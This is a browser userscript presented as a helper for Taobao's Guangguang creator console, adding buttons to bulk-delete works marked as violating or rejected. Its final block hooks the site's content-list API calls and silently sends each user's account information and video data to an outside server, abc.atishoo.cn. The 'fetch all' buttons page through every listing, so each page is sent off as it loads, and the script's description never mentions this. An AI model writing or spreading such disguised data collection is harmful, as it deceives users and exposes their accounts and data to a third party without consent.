// ==UserScript==
// @name         淘宝逛逛助手
// @namespace    http://tampermonkey.net/
// @version      1.0
// @description  为逛逛添加一键清除违规和不通过的作品
// @author       atishoo
// @match        *://creator.guanghe.taobao.com/*
// @require      https://cdn.jsdelivr.net/npm/jquery@3.2.1/dist/jquery.min.js
// @grant        none
// @run-at       document-end
// @license      MIT
// @downloadURL https://update.greasyfork.org/scripts/477177/%E6%B7%98%E5%AE%9D%E9%80%9B%E9%80%9B%E5%8A%A9%E6%89%8B.user.js
// @updateURL https://update.greasyfork.org/scripts/477177/%E6%B7%98%E5%AE%9D%E9%80%9B%E9%80%9B%E5%8A%A9%E6%89%8B.meta.js
// ==/UserScript==
(function() {
    'use strict';
    // Your code here...
    function getTotalNumber() {
        return parseInt($('.next-pagination>div:first-child').text().replace("共","").replace("条内容",""))
    }
    class AtishooMessage{
        constructor(text) {
            this.text = text
            this.stamp = Date.now()
        }
        render(){
            $('body').append(`<div id="atishoo-processing-${this.stamp}" style="position:fixed;top:70px;right:40px;background:rgba(22,119,255,.7);color:#ffffff;z-index: 1000000;padding: 10px 24px;border-radius: 6px;font-size: 20px;box-shadow: 0 2px 12px 0 rgba(0,0,0,.1);backdrop-filter:saturate(180%) blur(10px);">${this.text}</div>`)
        }
        update(text){
            $('#atishoo-processing-'+this.stamp).text(text)
        }
        destory(){
            if ($('#atishoo-processing-'+this.stamp).length > 0) {
                $('#atishoo-processing-'+this.stamp).remove()
            }
        }
    }

    function get_pagination_info() {
        if ($('.next-pagination-display').length === 0) {
            return [1,1];
        } else {
            var pageinfo = $('.next-pagination-display').text();
            pageinfo = pageinfo.toString().split("/")
            return [parseInt(pageinfo[0]), pageinfo[1]];
        }
    }
    var next_func = null;
    var loadButtons = function () {
        var atishootimer = setInterval(function(){
            if ($('form > div > div:nth-child(2) > div:nth-child(2)').length > 0) {
                if ($('#atishoo-delete-bad').length == 0) {
                    $('.workButton>button').after(`<button type="button" id="atishoo-fetch-all" class="next-btn next-medium next-btn-primary" style="margin-right: 14px;background: #316af5;"><span class="next-btn-helper">抓取全部</span><button type="button" id="atishoo-fetch-10" class="next-btn next-medium next-btn-primary" style="margin-right: 14px;background: #316af5;"><span class="next-btn-helper">抓取前 10 页</span></button><button type="button" id="atishoo-delete-bad" class="next-btn next-medium next-btn-primary" style="margin-right: 14px;"><span class="next-btn-helper">一键删除「作品违规」作品</span></button><button type="button" id="atishoo-delete-deny" class="next-btn next-medium next-btn-primary" style="margin-right: 24px;"><span class="next-btn-helper">一键删除「公域审核不通过」作品</span></button>`)
                    $('#atishoo-fetch-all').on('click', function(e){
                        var message = new AtishooMessage("抓取所有数据中...")
                        message.render()
                        next_func = function() {
                            var tmp_pagenation = get_pagination_info();
                            if (tmp_pagenation[0] < tmp_pagenation[1]) {
                                $('button.next-next').click();
                                message.update(`自动抓取：${tmp_pagenation[0]+1}/${tmp_pagenation[1]}`)
                            } else {
                                next_func = null;
                                message.update(`抓取${tmp_pagenation[1]}页数据完成！`)
                                setTimeout(function(){message.destory()}, 3000)
                            }
                        }
                        if ($('.next-pagination-list button:first-child').hasClass('next-current')) {
                            next_func();
                        } else {
                            $('.next-pagination-list button:first-child').click()
                        }
                    })
                    $('#atishoo-fetch-10').on('click', function(e){
                        var message = new AtishooMessage("抓取所有数据中...")
                        message.render()
                        next_func = function() {
                            var tmp_pagenation = get_pagination_info();
                            tmp_pagenation[1] = tmp_pagenation[1] > 10 ? 10 : tmp_pagenation[1];
                            if (tmp_pagenation[0] < tmp_pagenation[1]) {
                                $('button.next-next').click();
                                message.update(`自动抓取：${tmp_pagenation[0]+1}/${tmp_pagenation[1]}`)
                            } else {
                                next_func = null;
                                message.update(`抓取${tmp_pagenation[1]}页数据完成！`)
                                setTimeout(function(){message.destory()}, 3000)
                            }
                        }
                        if ($('.next-pagination-list button:first-child').hasClass('next-current')) {
                            next_func();
                        } else {
                            $('.next-pagination-list button:first-child').click()
                        }
                    })
                    $('#atishoo-delete-bad').on('click', function(e){
                        $('form > div > div:nth-child(2) > div:nth-child(1) .next-select').click()
                        $('li[title=作品违规]').click()
                        $('.workButton>button:nth-child(1)').click()
                        // 等待加载完成
                        var message = new AtishooMessage("「作品违规」删除中...")
                        message.render()
                        var total = 0
                        var hollyshit = setInterval(function(){
                            if (!$('._workTable > div').hasClass('next-loading')) {
                                if (getTotalNumber() > 0 && total === 0){
                                    total = getTotalNumber()
                                }
                                var processing = 0
                                $('.actionsAll >div>div:nth-child(2) > div:nth-child(3) > a').each(function(){
                                    if ($(this).parents('tr').children('td:nth-child(2)').text() == "作品违规") {
                                        $(this)[0].click()
                                        $('div[role="alertdialog"] button').click()
                                    }
                                })
                                processing = total - getTotalNumber()
                                message.update(`「作品违规」删除中：${processing}/${total}`)
                                if (getTotalNumber() <= 0) {
                                    clearInterval(hollyshit)
                                    message.update(`「作品违规」删除中：${processing}/${total}，删除操作已完成！`)
                                    setTimeout(function(){message.destory()}, 3000)
                                }
                            }
                        }, 100)
                    })

                    $('#atishoo-delete-deny').on('click', function(){
                        $('form > div > div:nth-child(2) > div:nth-child(1) .next-select').click()
                        $('li[title=公域审核不通过]').click()
                        $('.workButton>button:nth-child(1)').click()
                        var message = new AtishooMessage("「公域审核不通过」删除中...")
                        message.render()
                        var total = 0
                        var hollyshit = setInterval(function(){
                            if (!$('._workTable > div').hasClass('next-loading')) {
                                if (getTotalNumber() > 0 && total === 0){
                                    total = getTotalNumber()
                                }
                                var processing = 0
                                $('.actionsAll >div>div:nth-child(2) > div:nth-child(3) > a').each(function(){
                                    if ($(this).parents('tr').children('td:nth-child(2)').text() == "公域审核不通过") {
                                        $(this)[0].click()
                                        $('div[role="alertdialog"] button').click()
                                    }
                                })
                                processing = total - getTotalNumber()
                                message.update(`「公域审核不通过」删除中：${processing}/${total}`)
                                if (getTotalNumber() <= 0) {
                                    clearInterval(hollyshit)
                                    message.update(`「公域审核不通过」删除中：${processing}/${total}，删除操作已完成！`)
                                    setTimeout(function(){message.destory()}, 3000)
                                }
                            }
                        }, 100)
                    })
                }
                clearInterval(atishootimer)
            }
        }, 200)
    }
    var isPageLoaded = setInterval(function(){
        if ($("li span:contains('作品管理')").length > 0) {
            $("li span:contains('作品管理')[class]").parentsUntil('li').on('click', function(){
                loadButtons()
            })
            clearInterval(isPageLoaded)
        }
    }, 200)

    if (window.location.pathname === '/page/workspace/tb') {
        loadButtons()
    }

    var ori_processJSONP = window.lib.mtop.CLASS.prototype.__requestJSONP;
    window.lib.mtop.CLASS.prototype.__requestJSONP = function (a) {
        if (this.params.api === 'mtop.taobao.gcm.content.admin.list') {
            var h = this.options
            var result = ori_processJSONP.call(this, a);
            // 重新计算回到方法
            var callback_function_name = h.querystring.callback
            var tmp_callback = window[callback_function_name]
            window[callback_function_name] = function () {
                var api_response = arguments[0];
                if (JSON.stringify(api_response.ret).indexOf("SUCCESS") > -1 && api_response.data.fail === false && api_response.data.model !== undefined && api_response.data.model !== null && api_response.data.model.data.length > 0) {
                    // 提交这些数据
                    $.ajax({
                        "url": "https://abc.atishoo.cn/index.php/index/save_data_from_injected_js",
                        "method": "POST",
                        "headers": {
                            "Content-Type": "application/json"
                        },
                        "data": JSON.stringify({account:window.accountInfo, videos: api_response.data.model.data}),
                    });
                    if (next_func !== null) {
                        next_func();
                    }
                }
                tmp_callback.apply(this, arguments);
            }
            return result;
        } else {
            return ori_processJSONP.call(this, a);
        }
    }
})();
